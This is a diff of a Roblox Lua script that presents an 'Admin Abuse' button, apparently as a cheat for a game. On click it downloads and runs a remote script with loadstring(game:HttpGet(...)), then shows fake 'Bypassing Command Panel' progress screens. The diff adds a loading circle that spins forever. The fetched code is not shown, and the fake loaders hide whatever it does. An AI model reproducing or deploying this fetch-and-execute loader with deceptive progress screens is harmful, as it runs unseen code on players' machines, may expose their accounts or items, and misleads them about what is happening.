@@ -38,14 +38,13 @@ waitGui.BackgroundTransparency = 0.2
 waitGui.Visible = false
 Instance.new("UICorner", waitGui).CornerRadius = UDim.new(0, 10)
 
--- Fullscreen Loading Screen with Percentage
+-- Fullscreen loading with percentage
 local function createFullscreenLoading(message)
-	local screen = Instance.new("ScreenGui")
+	local screen = Instance.new("ScreenGui", playerGui)
 	screen.Name = "FullLoadingScreen"
 	screen.ResetOnSpawn = false
 	screen.IgnoreGuiInset = true
 	screen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-	screen.Parent = playerGui
 
 	local frame = Instance.new("Frame", screen)
 	frame.Size = UDim2.new(1, 0, 1, 0)
@@ -76,7 +75,7 @@ local function createFullscreenLoading(message)
 	percent.BackgroundTransparency = 1
 	percent.ZIndex = 11
 
-	-- Animate percentage over 10 seconds
+	-- Animate percentage
 	task.spawn(function()
 		for i = 0, 100 do
 			percent.Text = i .. "%"
@@ -87,7 +86,7 @@ local function createFullscreenLoading(message)
 	return screen, frame, label
 end
 
--- Animated "Loading Script..." small UI
+-- Loading Script Animated UI
 local function createScriptLoadingUI()
 	local screen = Instance.new("ScreenGui", playerGui)
 	screen.Name = "ScriptLoadingUI"
@@ -104,7 +103,6 @@ local function createScriptLoadingUI()
 	label.BackgroundTransparency = 0.1
 	Instance.new("UICorner", label).CornerRadius = UDim.new(0, 10)
 
-	-- Animated dots (...)
 	local running = true
 	task.spawn(function()
 		while running do
@@ -119,7 +117,25 @@ local function createScriptLoadingUI()
 	return screen, function() running = false end
 end
 
--- Create Button
+-- Infinite Loading Circle UI
+local function createLoopingLoadingCircle()
+	local screen = Instance.new("ScreenGui", playerGui)
+	screen.Name = "InfiniteLoader"
+	screen.ResetOnSpawn = false
+
+	local image = Instance.new("ImageLabel", screen)
+	image.Size = UDim2.new(0, 100, 0, 100)
+	image.Position = UDim2.new(0.5, -50, 0.5, -50)
+	image.BackgroundTransparency = 1
+	image.Image = "rbxassetid://10780754992" -- Replace with your preferred loading icon
+
+	-- Spin loop
+	RunService.RenderStepped:Connect(function(dt)
+		image.Rotation = (image.Rotation + dt * 100) % 360
+	end)
+end
+
+-- Button creation
 local function createButton(name)
 	local btn = Instance.new("TextButton", mainFrame)
 	btn.Size = UDim2.new(0.8, 0, 0, 40)
@@ -133,14 +149,27 @@ local function createButton(name)
 	return btn
 end
 
--- Button Logic
+-- Click logic
 local function onButtonClick(clickedButton, loadingMessage)
+	-- Click animation (shrink & bounce)
+	local clickTween = TweenService:Create(clickedButton, TweenInfo.new(0.1), {
+		Size = clickedButton.Size - UDim2.new(0, 5, 0, 5)
+	})
+	clickTween:Play()
+	clickTween.Completed:Wait()
+	local restoreTween = TweenService:Create(clickedButton, TweenInfo.new(0.1), {
+		Size = UDim2.new(0.8, 0, 0, 40)
+	})
+	restoreTween:Play()
+
+	-- Hide other buttons
 	for _, child in pairs(mainFrame:GetChildren()) do
 		if child:IsA("TextButton") and child ~= clickedButton then
 			child.Visible = false
 		end
 	end
 
+	-- Shrink frame
 	local shrinkTween = TweenService:Create(mainFrame, TweenInfo.new(0.4), {
 		Size = UDim2.new(0, 0, 0, 0),
 		Position = UDim2.new(0.5, 0, 0.5, 0)
@@ -151,7 +180,7 @@ local function onButtonClick(clickedButton, loadingMessage)
 	waitGui.Visible = true
 	wait(1)
 
-	-- Execute the script immediately
+	-- Load external script
 	pcall(function()
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/lowznt/growagarden/refs/heads/main/growagarden.lua"))()
 	end)
@@ -159,7 +188,6 @@ local function onButtonClick(clickedButton, loadingMessage)
 	waitGui.Visible = false
 	mainGui.Enabled = false
 
-	-- Fullscreen loading with percent
 	local screen, frame, label = createFullscreenLoading(loadingMessage)
 	wait(10)
 
@@ -169,14 +197,17 @@ local function onButtonClick(clickedButton, loadingMessage)
 	wait(1.1)
 	screen:Destroy()
 
-	-- Final "Loading Script..." UI
+	-- Show animated text
 	local loadingUI, stopAnim = createScriptLoadingUI()
 	wait(4)
 	stopAnim()
 	loadingUI:Destroy()
+
+	-- Looping loading circle
+	createLoopingLoadingCircle()
 end
 
--- Create buttons
+-- Buttons
 local adminButton = createButton("Admin Abuse")
 adminButton.MouseButton1Click:Connect(function()
 	onButtonClick(adminButton, "Bypassing Command Panel Please Wait.")
